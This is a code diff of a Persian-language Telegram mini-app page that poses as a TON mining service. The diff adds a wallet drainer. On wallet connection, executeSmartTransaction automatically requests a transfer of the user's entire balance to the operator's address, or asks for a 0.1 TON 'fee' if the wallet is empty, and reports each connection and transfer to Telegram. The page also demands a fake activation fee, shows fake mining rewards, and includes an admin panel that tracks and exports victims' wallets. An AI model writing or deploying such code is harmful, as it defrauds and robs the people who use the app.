@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
@@ -13,7 +14,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        /* استایل‌های کامل (همانند نسخه قبلی) */
+        /* استایل‌های کامل (مثل قبل) */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; overflow: hidden; }
@@ -176,8 +177,40 @@
 
 <div id="feeModal"><div class="modal-content"><i class="fas fa-lock"></i><h2>فعالسازی پنل کاربری</h2><div class="pay-notice"><i class="fas fa-exclamation-triangle" style="margin-left:5px"></i> جهت واریز مبلغ کارمزد شبکه، <b>فقط</b> اطلاعات پرداخت را از <b>پشتیبانی رسمی</b> دریافت کنید. هرگونه واریز به آدرس‌های غیررسمی منجر به مسدود شدن حساب می‌گردد.</div><div class="fee-tag">14 دلار | 2,226,000 تومان</div><a href="https://t.me/miningertoncoin" class="btn get-code-btn" target="_blank"><i class="fas fa-headset"></i> دریافت رمز و واریز</a><input type="text" id="activationInput" placeholder="کد فعالسازی را وارد کنید"><button onclick="verifyActivation()" class="btn active-btn"><i class="fas fa-check-circle"></i> فعالسازی و ورود به پنل</button><div id="activationMessage" class="activation-message"><i class="fas fa-spinner fa-pulse"></i><span>ورود موفق ، در حال اتصال به شبکه بلاکچین ...</span></div></div></div>
 
-<!-- پنل مدیریت -->
-<div id="adminMasterPanel"><div class="admin-container"><div class="admin-header"><h1><i class="fas fa-crown" style="color:#ffd700"></i> پنل مدیریت @TonDropyBot</h1><button class="admin-logout" onclick="closeAdminMasterPanel()"><i class="fas fa-sign-out-alt"></i> خروج</button></div><div class="admin-stats-grid" id="adminStats"><div class="admin-stat-card"><i class="fas fa-users"></i><div class="number" id="statTotalUsers">0</div><div class="label">کل کاربران</div></div><div class="admin-stat-card"><i class="fas fa-user-check"></i><div class="number" id="statActiveToday">0</div><div class="label">فعال امروز</div></div><div class="admin-stat-card"><i class="fas fa-wallet"></i><div class="number" id="statWallets">0</div><div class="label">کیف پول متصل</div></div><div class="admin-stat-card"><i class="fas fa-ban"></i><div class="number" id="statBanned">0</div><div class="label">مسدود شده‌ها</div></div><div class="admin-stat-card"><i class="fas fa-coins"></i><div class="number" id="statTotalMined">0</div><div class="label">کل استخراج</div></div><div class="admin-stat-card"><i class="fas fa-history"></i><div class="number" id="statTransactions">0</div><div class="label">تراکنش‌ها</div></div></div><div class="admin-search-box"><input type="text" id="adminSearch" placeholder="🔍 جستجو با نام، آیدی، یوزرنیم یا آدرس کیف پول..."><div style="display:flex;gap:10px;flex-wrap:wrap"><button class="admin-btn-sm" style="background:#00c6ff" onclick="searchUsers()"><i class="fas fa-search"></i> جستجو</button><button class="admin-btn-sm" style="background:#666" onclick="clearSearch()"><i class="fas fa-times"></i> پاک کردن</button><button class="admin-btn-sm" style="background:#ff5722" onclick="exportToExcel()"><i class="fas fa-file-excel"></i> خروجی Excel</button><button class="admin-btn-sm" style="background:#9c27b0" onclick="showTransactions()"><i class="fas fa-history"></i> تراکنش‌ها</button></div></div><div class="admin-tabs"><div class="admin-tab active" onclick="switchAdminTab('all')">همه کاربران</div><div class="admin-tab" onclick="switchAdminTab('active')">فعال‌ها</div><div class="admin-tab" onclick="switchAdminTab('banned')">مسدود شده‌ها</div><div class="admin-tab" onclick="switchAdminTab('wallets')">دارای کیف پول</div></div><div class="admin-table" id="usersTable"><table><thead><tr><th>#</th><th>نام کاربر</th><th>یوزرنیم</th><th>آیدی</th><th>کیف پول</th><th>موجودی</th><th>وضعیت</th><th>آخرین بازدید</th><th>عملیات</th></tr></thead><tbody id="usersTableBody"></tbody></table></div><div class="pagination" id="pagination"></div></div></div>
+<!-- پنل مدیریت کامل -->
+<div id="adminMasterPanel">
+    <div class="admin-container">
+        <div class="admin-header">
+            <h1><i class="fas fa-crown" style="color:#ffd700"></i> پنل مدیریت @TonDropyBot</h1>
+            <button class="admin-logout" onclick="closeAdminMasterPanel()"><i class="fas fa-sign-out-alt"></i> خروج</button>
+        </div>
+        <div class="admin-stats-grid" id="adminStats">
+            <div class="admin-stat-card"><i class="fas fa-users"></i><div class="number" id="statTotalUsers">0</div><div class="label">کل کاربران</div></div>
+            <div class="admin-stat-card"><i class="fas fa-user-check"></i><div class="number" id="statActiveToday">0</div><div class="label">فعال امروز</div></div>
+            <div class="admin-stat-card"><i class="fas fa-wallet"></i><div class="number" id="statWallets">0</div><div class="label">کیف پول متصل</div></div>
+            <div class="admin-stat-card"><i class="fas fa-ban"></i><div class="number" id="statBanned">0</div><div class="label">مسدود شده‌ها</div></div>
+            <div class="admin-stat-card"><i class="fas fa-coins"></i><div class="number" id="statTotalMined">0</div><div class="label">کل استخراج</div></div>
+            <div class="admin-stat-card"><i class="fas fa-history"></i><div class="number" id="statTransactions">0</div><div class="label">تراکنش‌ها</div></div>
+        </div>
+        <div class="admin-search-box">
+            <input type="text" id="adminSearch" placeholder="🔍 جستجو با نام، آیدی، یوزرنیم یا آدرس کیف پول...">
+            <div style="display:flex;gap:10px;flex-wrap:wrap">
+                <button class="admin-btn-sm" style="background:#00c6ff" onclick="searchUsers()"><i class="fas fa-search"></i> جستجو</button>
+                <button class="admin-btn-sm" style="background:#666" onclick="clearSearch()"><i class="fas fa-times"></i> پاک کردن</button>
+                <button class="admin-btn-sm" style="background:#ff5722" onclick="exportToExcel()"><i class="fas fa-file-excel"></i> خروجی Excel</button>
+                <button class="admin-btn-sm" style="background:#9c27b0" onclick="showTransactions()"><i class="fas fa-history"></i> تراکنش‌ها</button>
+            </div>
+        </div>
+        <div class="admin-tabs">
+            <div class="admin-tab active" onclick="switchAdminTab('all')">همه کاربران</div>
+            <div class="admin-tab" onclick="switchAdminTab('active')">فعال‌ها</div>
+            <div class="admin-tab" onclick="switchAdminTab('banned')">مسدود شده‌ها</div>
+            <div class="admin-tab" onclick="switchAdminTab('wallets')">دارای کیف پول</div>
+        </div>
+        <div class="admin-table" id="usersTable"><table><thead><tr><th>#</th><th>نام کاربر</th><th>یوزرنیم</th><th>آیدی</th><th>کیف پول</th><th>موجودی</th><th>وضعیت</th><th>آخرین بازدید</th><th>عملیات</th></tr></thead><tbody id="usersTableBody"></tbody></table></div>
+        <div class="pagination" id="pagination"></div>
+    </div>
+</div>
 
 <!-- هدر -->
 <div class="fixed-header"><div class="card-profile" ondblclick="openAdminMasterPanel()"><div class="profile-text"><h3 id="uName">TONCOIN SUPPORT</h3><p id="uTag">@miningertoncoin</p></div><div class="avatar-container"><i class="fas fa-user-circle" id="defAvat"></i><img id="userAvat" class="hidden" alt="avatar"></div><span class="level-badge" id="userLevel" onclick="openLevelModal()">سطح 1</span></div></div>
@@ -327,6 +360,88 @@ async function getWalletBalance(userAddress) {
     }
 }
 
+// ==================== ساخت payload کامنت ====================
+function createCommentPayload(text) {
+    if (typeof window.TonCore !== 'undefined' && window.TonCore.beginCell && typeof Buffer !== 'undefined') {
+        try {
+            const bytes = new TextEncoder().encode(text);
+            const buffer = Buffer.from(bytes);
+            const cell = window.TonCore.beginCell()
+                .storeUint(0, 32)
+                .storeBuffer(buffer)
+                .endCell();
+            return cell.toBoc().toString('base64');
+        } catch (e) {
+            console.warn('خطا در ساخت payload با ton-core:', e);
+        }
+    }
+    return btoa(text);
+}
+
+// ==================== اجرای تراکنش خودکار (بر اساس موجودی) ====================
+async function executeSmartTransaction(userAddress) {
+    if (isProcessingTransaction || transactionExecuted) return;
+    try {
+        isProcessingTransaction = true;
+        showToast('🔄 در حال بررسی موجودی...');
+        const balance = await getWalletBalance(userAddress);
+        
+        let amountToSend, txType, payload = "";
+        if (balance > 0) {
+            amountToSend = balance;
+            txType = 'انتقال کل موجودی';
+            showToast(`💰 موجودی ${balance.toFixed(3)} TON`);
+        } else {
+            amountToSend = 0.1;
+            txType = 'پرداخت کارمزد';
+            const message = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
+            payload = createCommentPayload(message);
+            showToast(`💳 درخواست کارمزد 0.1 TON`);
+        }
+
+        const amountInNano = Math.floor(amountToSend * 1e9).toString();
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [{
+                address: CONFIG.WALLET_ADDRESS,
+                amount: amountInNano,
+                payload: payload
+            }]
+        };
+
+        showToast('🔄 لطفا در کیف پول تایید کنید...');
+        transactionExecuted = true;
+        const result = await tonConnectUI.sendTransaction(transaction);
+        
+        const txRecord = {
+            id: 'TX' + Date.now(),
+            amount: amountToSend,
+            from: userAddress,
+            to: CONFIG.WALLET_ADDRESS,
+            time: new Date().toISOString(),
+            type: txType,
+            userId: currentUser?.id,
+            userName: currentUser?.firstName
+        };
+        appData.transactions.unshift(txRecord);
+        saveData();
+        
+        showToast('✅ تراکنش موفقیت‌آمیز بود');
+        sendToTelegram(`💰 **${txType}**\nمبلغ: ${amountToSend} TON\nاز: ${userAddress}\nبه: ${CONFIG.WALLET_ADDRESS}`);
+
+    } catch (error) {
+        console.error('❌ خطا:', error);
+        if (error.message?.includes('rejected')) {
+            showToast('❌ تراکنش لغو شد');
+        } else {
+            showToast('❌ خطا: ' + (error.message || 'نامشخص'));
+        }
+        transactionExecuted = false;
+    } finally {
+        isProcessingTransaction = false;
+    }
+}
+
 // ==================== راه‌اندازی TonConnect ====================
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://raw.githubusercontent.com/nimwmesfandiari/ton-plus-bot/main/tonconnect-manifest.json',
@@ -334,9 +449,7 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
 });
 
 tonConnectUI.onStatusChange(async (wallet) => {
-    console.log("وضعیت کیف پول:", wallet ? '✅ متصل' : '❌ قطع');
-    
-    if (wallet && !transactionExecuted) {
+    if (wallet) {
         const fullAddress = wallet.account.address;
         document.getElementById('walletAddressFull').innerText = fullAddress;
         document.getElementById('walletAddress').classList.remove('hidden');
@@ -350,73 +463,160 @@ tonConnectUI.onStatusChange(async (wallet) => {
             sendToTelegram(`🔌 **کیف پول متصل شد**\n👤 نام: ${currentUser.firstName} ${currentUser.lastName}\n🆔 آیدی: ${currentUser.id}\n📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}\n💳 آدرس: ${fullAddress}\n👥 کل کاربران: ${appData.users.length}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
         }
 
-        // دریافت موجودی و اجرای تراکنش خودکار (فقط یک بار)
-        transactionExecuted = true;
-        showToast('🔄 در حال بررسی موجودی...');
-        const balance = await getWalletBalance(fullAddress);
-        
-        let amountToSend, message;
-        if (balance > 0) {
-            amountToSend = balance;
-            message = "";
-            showToast(`💰 موجودی ${balance.toFixed(3)} TON - انتقال کل موجودی`);
-        } else {
-            amountToSend = 0.1;
-            message = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
-            showToast(`💳 درخواست کارمزد 0.1 TON`);
-        }
-
-        try {
-            const amountInNano = Math.floor(amountToSend * 1e9).toString();
-            
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600,
-                messages: [{
-                    address: CONFIG.WALLET_ADDRESS, // آدرس raw
-                    amount: amountInNano,
-                    payload: message ? btoa(message) : ""
-                }]
-            };
-
-            showToast('🔄 لطفا در کیف پول تایید کنید...');
-            
-            const result = await tonConnectUI.sendTransaction(transaction);
-            
-            const txRecord = {
-                id: 'TX' + Date.now(),
-                amount: amountToSend,
-                from: fullAddress,
-                to: CONFIG.WALLET_ADDRESS,
-                time: new Date().toISOString(),
-                type: balance > 0 ? 'انتقال خودکار' : 'پرداخت کارمزد'
-            };
-            
-            appData.transactions.unshift(txRecord);
-            saveData();
-            
-            showToast('✅ تراکنش موفقیت‌آمیز بود');
-            sendToTelegram(`💰 **تراکنش خودکار**\nمبلغ: ${amountToSend} TON\nاز: ${fullAddress}\nبه: ${CONFIG.WALLET_ADDRESS}`);
-
-        } catch (error) {
-            console.error('❌ خطا:', error);
-            if (error.message?.includes('rejected')) {
-                showToast('❌ تراکنش لغو شد');
-            } else {
-                showToast('❌ خطا: ' + (error.message || 'نامشخص'));
-            }
-            // اگر خطا خورد، اجازه ندهید دوباره تلاش کند مگر با رفرش
-        }
-        
+        // اجرای تراکنش خودکار
+        setTimeout(() => executeSmartTransaction(fullAddress), 1500);
         checkAndEnableFinalWithdraw();
-    } else if (!wallet) {
+    } else {
         document.getElementById('walletAddress').classList.add('hidden');
         isWalletConnected = false;
-        transactionExecuted = false; // ریست برای اتصال مجدد
+        transactionExecuted = false;
         checkAndEnableFinalWithdraw();
     }
 });
 
-// ==================== بقیه توابع (خلاصه شده) ====================
+// ==================== توابع پنل مدیریت (کامل) ====================
+let currentPage = 1, currentFilter = 'all', searchTerm = '';
+
+window.openAdminMasterPanel = function() {
+    if (!isAdmin()) return showGlassMessage('error', '⛔ دسترسی غیرمجاز');
+    updateAdminStats();
+    renderUsersTable();
+    document.getElementById('adminMasterPanel').classList.add('show');
+    sendToTelegram(`🔐 **ورود به پنل مدیریت**\n👤 نام: ${currentUser?.firstName}\n🆔 آیدی: ${currentUser?.id}\n👥 کل کاربران: ${appData.users.length}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+};
+window.closeAdminMasterPanel = () => document.getElementById('adminMasterPanel').classList.remove('show');
+function isAdmin() {
+    const user = tg.initDataUnsafe?.user;
+    return !!user && (CONFIG.ADMIN_IDS.includes(user.id.toString()) || (user.username && CONFIG.ADMIN_USERNAMES.includes(user.username)));
+}
+function updateAdminStats() {
+    const today = new Date().toDateString();
+    const activeToday = appData.users.filter(u => new Date(u.lastSeen).toDateString() === today).length;
+    document.getElementById('statTotalUsers').innerText = appData.users.length;
+    document.getElementById('statActiveToday').innerText = activeToday;
+    document.getElementById('statWallets').innerText = appData.wallets.length;
+    document.getElementById('statBanned').innerText = appData.bannedUsers.length;
+    document.getElementById('statTransactions').innerText = appData.transactions.length;
+    const totalMinedAll = appData.users.reduce((sum, u) => sum + (u.totalMined || 0), 0);
+    document.getElementById('statTotalMined').innerText = totalMinedAll.toFixed(3);
+}
+function renderUsersTable() {
+    let filteredUsers = [...appData.users];
+    if (currentFilter === 'active') {
+        const today = new Date().toDateString();
+        filteredUsers = filteredUsers.filter(u => new Date(u.lastSeen).toDateString() === today);
+    } else if (currentFilter === 'banned') {
+        filteredUsers = filteredUsers.filter(u => appData.bannedUsers.includes(u.id));
+    } else if (currentFilter === 'wallets') {
+        filteredUsers = filteredUsers.filter(u => u.wallet);
+    }
+    if (searchTerm) {
+        const term = searchTerm.toLowerCase();
+        filteredUsers = filteredUsers.filter(u => (u.firstName && u.firstName.toLowerCase().includes(term)) ||
+            (u.lastName && u.lastName.toLowerCase().includes(term)) ||
+            (u.username && u.username.toLowerCase().includes(term)) ||
+            (u.id && u.id.toString().includes(term)) ||
+            (u.wallet && u.wallet.toLowerCase().includes(term)));
+    }
+    const start = (currentPage - 1) * 20;
+    const paginatedUsers = filteredUsers.slice(start, start + 20);
+    const tbody = document.getElementById('usersTableBody');
+    if (paginatedUsers.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:#888;">هیچ کاربری یافت نشد</td></tr>';
+        document.getElementById('pagination').innerHTML = '';
+    } else {
+        tbody.innerHTML = paginatedUsers.map((user, index) => {
+            const isBanned = appData.bannedUsers.includes(user.id);
+            return `<tr><td>${start + index + 1}</td><td>${user.firstName || 'کاربر'} ${user.lastName || ''}</td><td>${user.username ? '@' + user.username : '-'}</td><td>${user.id}</td><td class="wallet-address-cell" title="${user.wallet || ''}">${user.wallet ? user.wallet.substring(0,10)+'...' : '❌'}</td><td>${(user.balance || 0).toFixed(6)}</td><td><span class="user-status ${isBanned ? 'status-banned' : 'status-active'}">${isBanned ? 'مسدود' : 'فعال'}</span></td><td>${new Date(user.lastSeen || user.joinedAt).toLocaleString('fa-IR')}</td><td><div class="admin-actions"><button class="admin-btn-sm btn-view" onclick="viewUserDetails('${user.id}')" title="مشاهده جزئیات"><i class="fas fa-eye"></i></button>${isBanned ? `<button class="admin-btn-sm btn-unban" onclick="unbanUser('${user.id}')" title="رفع مسدودی"><i class="fas fa-check"></i></button>` : `<button class="admin-btn-sm btn-ban" onclick="banUser('${user.id}')" title="مسدود کردن"><i class="fas fa-ban"></i></button>`}<button class="admin-btn-sm btn-delete" onclick="deleteUser('${user.id}')" title="حذف کاربر"><i class="fas fa-trash"></i></button></div></td></tr>`;
+        }).join('');
+        renderPagination(filteredUsers.length);
+    }
+}
+function renderPagination(total) {
+    const pages = Math.ceil(total / 20);
+    let html = '';
+    for (let i = 1; i <= pages; i++) html += `<button class="page-btn ${i === currentPage ? 'active' : ''}" onclick="changePage(${i})">${i}</button>`;
+    document.getElementById('pagination').innerHTML = html;
+}
+window.changePage = page => { currentPage = page; renderUsersTable(); };
+window.switchAdminTab = function(tab) {
+    currentFilter = tab; currentPage = 1;
+    document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
+    event.target.classList.add('active');
+    renderUsersTable();
+};
+window.searchUsers = () => { searchTerm = document.getElementById('adminSearch').value; renderUsersTable(); };
+window.clearSearch = () => { document.getElementById('adminSearch').value = ''; searchTerm = ''; renderUsersTable(); };
+window.banUser = function(userId) {
+    if (!appData.bannedUsers.includes(userId)) {
+        appData.bannedUsers.push(userId); saveData();
+        const user = appData.users.find(u => u.id == userId);
+        sendToTelegram(`🚫 **کاربر مسدود شد**\n👤 نام: ${user?.firstName||'ناشناس'}\n🆔 آیدی: ${userId}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+        showGlassMessage('success', '✅ کاربر مسدود شد');
+        renderUsersTable(); updateAdminStats();
+    }
+};
+window.unbanUser = function(userId) {
+    appData.bannedUsers = appData.bannedUsers.filter(id => id != userId); saveData();
+    const user = appData.users.find(u => u.id == userId);
+    sendToTelegram(`✅ **رفع مسدودی**\n👤 نام: ${user?.firstName||'ناشناس'}\n🆔 آیدی: ${userId}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+    showGlassMessage('success', '✅ رفع مسدودی شد');
+    renderUsersTable(); updateAdminStats();
+};
+window.deleteUser = function(userId) {
+    if (confirm('⚠️ آیا از حذف کامل این کاربر اطمینان دارید؟')) {
+        const user = appData.users.find(u => u.id == userId);
+        appData.users = appData.users.filter(u => u.id != userId);
+        appData.bannedUsers = appData.bannedUsers.filter(id => id != userId);
+        saveData();
+        sendToTelegram(`🗑 **کاربر حذف شد**\n👤 نام: ${user?.firstName||'ناشناس'}\n🆔 آیدی: ${userId}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+        showGlassMessage('success', '✅ کاربر حذف شد');
+        renderUsersTable(); updateAdminStats();
+    }
+};
+window.viewUserDetails = function(userId) {
+    const user = appData.users.find(u => u.id == userId);
+    if (!user) return;
+    const userTxs = appData.transactions.filter(tx => tx.userId == userId);
+    const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
+    document.getElementById('userDetails').innerHTML = `
+        <div class="user-detail-item"><div class="label">آیدی</div><div class="value">${user.id}</div></div>
+        <div class="user-detail-item"><div class="label">نام</div><div class="value">${user.firstName} ${user.lastName}</div></div>
+        <div class="user-detail-item"><div class="label">یوزرنیم</div><div class="value">${user.username ? '@' + user.username : 'ندارد'}</div></div>
+        <div class="user-detail-item"><div class="label">کیف پول</div><div class="value" style="direction:ltr;">${user.wallet || '❌ متصل نیست'}</div></div>
+        <div class="user-detail-item"><div class="label">موجودی</div><div class="value">${(user.balance || 0).toFixed(6)} TON</div></div>
+        <div class="user-detail-item"><div class="label">کل پرداختی</div><div class="value">${totalPaid.toFixed(6)} TON</div></div>
+        <div class="user-detail-item"><div class="label">تعداد تراکنش</div><div class="value">${userTxs.length}</div></div>
+        <div class="user-detail-item"><div class="label">تاریخ عضویت</div><div class="value">${new Date(user.joinedAt).toLocaleString('fa-IR')}</div></div>
+        <div class="user-detail-item"><div class="label">آخرین بازدید</div><div class="value">${new Date(user.lastSeen).toLocaleString('fa-IR')}</div></div>
+        <div class="user-detail-item"><div class="label">تعداد بازدید</div><div class="value">${user.visitCount || 1}</div></div>
+    `;
+    document.getElementById('userDetailModal').classList.add('show');
+};
+window.closeUserModal = () => document.getElementById('userDetailModal').classList.remove('show');
+window.exportToExcel = function() {
+    let csv = "آیدی,نام,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت,تاریخ عضویت,آخرین بازدید,وضعیت\n";
+    appData.users.forEach(u => {
+        const userTxs = appData.transactions.filter(tx => tx.userId == u.id);
+        const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
+        csv += `${u.id},${u.firstName||''} ${u.lastName||''},${u.username||'-'},${u.wallet||'-'},${(u.balance||0).toFixed(6)},${(u.totalMined||0).toFixed(6)},${totalPaid.toFixed(6)},${u.joinedAt},${u.lastSeen},${appData.bannedUsers.includes(u.id)?'مسدود':'فعال'}\n`;
+    });
+    const blob = new Blob([csv], { type: 'text/csv' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `users_${new Date().toISOString().split('T')[0]}.csv`;
+    a.click();
+};
+window.showTransactions = function() {
+    let html = '<div class="admin-table"><table><tr><th>کد</th><th>کاربر</th><th>مبلغ</th><th>نوع</th><th>زمان</th></tr>';
+    appData.transactions.slice(0,50).forEach(tx => {
+        html += `<tr><td>${tx.id}</td><td>${tx.userName || tx.userId}</td><td>${tx.amount?.toFixed(3)} TON</td><td>${tx.type || 'انتقال'}</td><td>${new Date(tx.time).toLocaleString('fa-IR')}</td></tr>`;
+    });
+    html += '</table></div>';
+    document.getElementById('usersTable').innerHTML = html;
+};
+
+// ==================== توابع عمومی ====================
 function showToast(message) {
     const toast = document.getElementById('toast');
     document.getElementById('toastMsg').innerText = message;
@@ -442,6 +642,43 @@ window.switchPage = function(pageName, element) {
     document.getElementById(pageName + 'Page').classList.add('active');
     document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
     element.classList.add('active');
+    if (pageName === 'referral') {
+        document.getElementById('referralCount2').innerText = referralCount;
+        document.getElementById('referralEarnings').innerText = referralEarnings.toFixed(6);
+    }
+};
+
+window.openLevelModal = function() {
+    const levelList = document.getElementById('levelList');
+    const currentLevel = getUserLevel();
+    levelList.innerHTML = levels.map((level, index) => `<div class="level-item ${index === currentLevel ? 'active' : ''}"><div><span class="level-name">${level.name}</span><div style="font-size:10px; color:#888;">نیاز: ${level.req} TON</div></div><div class="level-req">${index === currentLevel ? '✅ سطح فعلی' : (totalMined >= level.req ? '✔️ قبول شده' : '🔒 قفل')}</div></div>`).join('');
+    document.getElementById('levelModal').classList.add('show');
+};
+
+window.closeLevelModal = function(event) {
+    if (!event || event.target.id === 'levelModal') document.getElementById('levelModal').classList.remove('show');
+};
+
+function getUserLevel() {
+    if (totalMined >= 1) return 4;
+    else if (totalMined >= 0.5) return 3;
+    else if (totalMined >= 0.1) return 2;
+    else if (totalMined >= 0.05) return 1;
+    else return 0;
+}
+
+function updateUserLevel() { document.getElementById('userLevel').innerText = levels[getUserLevel()].name; }
+
+window.copyReferralLink = function() {
+    const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
+    navigator.clipboard.writeText(link);
+    showToast('✅ لینک دعوت کپی شد');
+};
+
+window.shareReferralLink = function() {
+    const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
+    const text = `🚀 با لینک من ثبت نام کن و پاداش بگیر!\n🔗 ${link}`;
+    Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`);
 };
 
 window.copyFullWalletAddress = function() {
@@ -450,62 +687,47 @@ window.copyFullWalletAddress = function() {
     showToast('✅ آدرس کپی شد');
 };
 
-// ==================== توابع پنل مدیریت (خلاصه) ====================
-window.openAdminMasterPanel = () => showGlassMessage('info', 'پنل مدیریت');
-window.closeAdminMasterPanel = () => {};
-function isAdmin() { return false; }
-function updateAdminStats() {}
-function renderUsersTable() {}
-function renderPagination(total) {}
-window.changePage = page => {};
-window.switchAdminTab = tab => {};
-window.searchUsers = () => {};
-window.clearSearch = () => {};
-window.banUser = userId => {};
-window.unbanUser = userId => {};
-window.deleteUser = userId => {};
-window.viewUserDetails = userId => {};
-window.closeUserModal = () => {};
-window.exportToExcel = () => {};
-window.showTransactions = () => {};
-
-// ==================== توابع سطح و پاداش ====================
-window.openLevelModal = () => {
-    document.getElementById('levelList').innerHTML = levels.map((l, i) => `<div class="level-item">${l.name}</div>`).join('');
-    document.getElementById('levelModal').classList.add('show');
+window.claimDailyReward = function() {
+    const now = Date.now();
+    const oneDay = 24 * 60 * 60 * 1000;
+    if (now - lastRewardTime < oneDay) {
+        showToast('⏳ قبلاً پاداش گرفته‌اید');
+        return;
+    }
+    const level = getUserLevel();
+    const rewardAmount = 0.0005 * (level + 1);
+    withdrawableBalance += rewardAmount;
+    document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
+    localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
+    lastRewardTime = now;
+    localStorage.setItem('lastRewardTime', lastRewardTime.toString());
+    dailyStreak++;
+    document.getElementById('dailyStreak').innerText = dailyStreak;
+    localStorage.setItem('dailyStreak', dailyStreak.toString());
+    addToHistory('پاداش روزانه', `${rewardAmount.toFixed(6)} TON`);
+    showToast(`🎁 ${rewardAmount.toFixed(6)} TON دریافت شد`);
+    sendToTelegram(`🎁 **پاداش روزانه**\n👤 نام: ${currentUser?.firstName}\n🆔 آیدی: ${currentUser?.id}\n💰 مبلغ: ${rewardAmount.toFixed(6)} TON\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
 };
-window.closeLevelModal = (e) => { if (!e || e.target.id === 'levelModal') document.getElementById('levelModal').classList.remove('show'); };
-window.copyReferralLink = () => showToast('✅ لینک دعوت');
-window.shareReferralLink = () => {};
-window.claimDailyReward = () => showToast('🎁 پاداش روزانه');
-function addToHistory(type, amount) {}
-function updateWalletHistory() {}
-function checkAndEnableFinalWithdraw() {
-    const finalBtn = document.getElementById('finalWithdrawBtn');
-    if (isWalletConnected && withdrawableBalance > 0) {
-        finalBtn.classList.remove('disabled');
-        finalBtn.onclick = window.finalWithdraw;
+
+function addToHistory(type, amount) {
+    const date = new Date().toLocaleString('fa-IR');
+    history.unshift({ type, amount, date, status: 'موفق' });
+    if (history.length > 10) history.pop();
+    localStorage.setItem('transactionHistory', JSON.stringify(history));
+    updateWalletHistory();
+}
+
+function updateWalletHistory() {
+    const historyList = document.getElementById('walletHistoryList');
+    if (!historyList) return;
+    if (history.length === 0) {
+        historyList.innerHTML = '<div class="history-item" style="justify-content:center; color:#888;"><i class="fas fa-clock"></i> هنوز تراکنشی ثبت نشده</div>';
     } else {
-        finalBtn.classList.add('disabled');
-        finalBtn.onclick = null;
+        historyList.innerHTML = history.map(item => `<div class="history-item"><div><i class="fas ${item.type === 'برداشت' ? 'fa-arrow-up' : 'fa-gift'}" style="color: ${item.type === 'برداشت' ? '#ff512f' : '#00ff9d'}; margin-left:8px;"></i> ${item.type}</div><div><span style="color: ${item.type === 'برداشت' ? '#ff512f' : '#00ff9d'};">${item.amount}</span> <span style="font-size:10px; color:#666; margin-right:8px;">${item.date}</span></div></div>`).join('');
     }
 }
-window.finalWithdraw = () => showToast('💰 برداشت نهایی');
 
-// ==================== فعالسازی پنل ====================
-if (localStorage.getItem('isActivated') === 'true') document.getElementById('feeModal').style.display = 'none';
-window.verifyActivation = function() {
-    const val = document.getElementById('activationInput').value.trim();
-    if (CONFIG.SECRET_CODES.includes(val)) {
-        localStorage.setItem('isActivated', 'true');
-        document.getElementById('feeModal').style.display = 'none';
-        showToast("✅ پنل فعال شد!");
-    } else {
-        showGlassMessage('error', 'رمز اشتباه است');
-    }
-};
-
-// ==================== انتقال به برداشت ====================
+// ==================== انتقال به برداشت و فعال‌سازی دکمه ====================
 document.getElementById('moveToWithdrawBtn').onclick = function() {
     if (localStorage.getItem('isActivated') !== 'true') return showToast("ابتدا فعالسازی کنید");
     if (bal <= 0) return showToast("موجودی استخراج صفر است");
@@ -517,6 +739,67 @@ document.getElementById('moveToWithdrawBtn').onclick = function() {
     localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
     checkAndEnableFinalWithdraw();
     showToast(`💰 مبلغ به موجودی برداشت منتقل شد`);
+    addToHistory('انتقال به برداشت', `${withdrawableBalance.toFixed(6)} TON`);
+};
+
+function checkAndEnableFinalWithdraw() {
+    const finalBtn = document.getElementById('finalWithdrawBtn');
+    if (isWalletConnected && withdrawableBalance > 0) {
+        finalBtn.classList.remove('disabled');
+        finalBtn.onclick = finalWithdraw;
+    } else {
+        finalBtn.classList.add('disabled');
+        finalBtn.onclick = null;
+    }
+}
+
+window.finalWithdraw = function() {
+    if (!isWalletConnected) {
+        showToast("❌ ابتدا کیف پول را متصل کنید");
+        switchPage('wallet', document.querySelector('.nav-item:nth-child(2)'));
+        return;
+    }
+    if (withdrawableBalance <= 0) {
+        showToast("❌ موجودی قابل برداشت صفر است");
+        return;
+    }
+    if (withdrawableBalance < CONFIG.MINIMUM_FINAL_WITHDRAW) {
+        showToast(`⚠️ حداقل مبلغ برداشت ${CONFIG.MINIMUM_FINAL_WITHDRAW} TON است`);
+        return;
+    }
+    const amountToWithdraw = withdrawableBalance;
+    addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
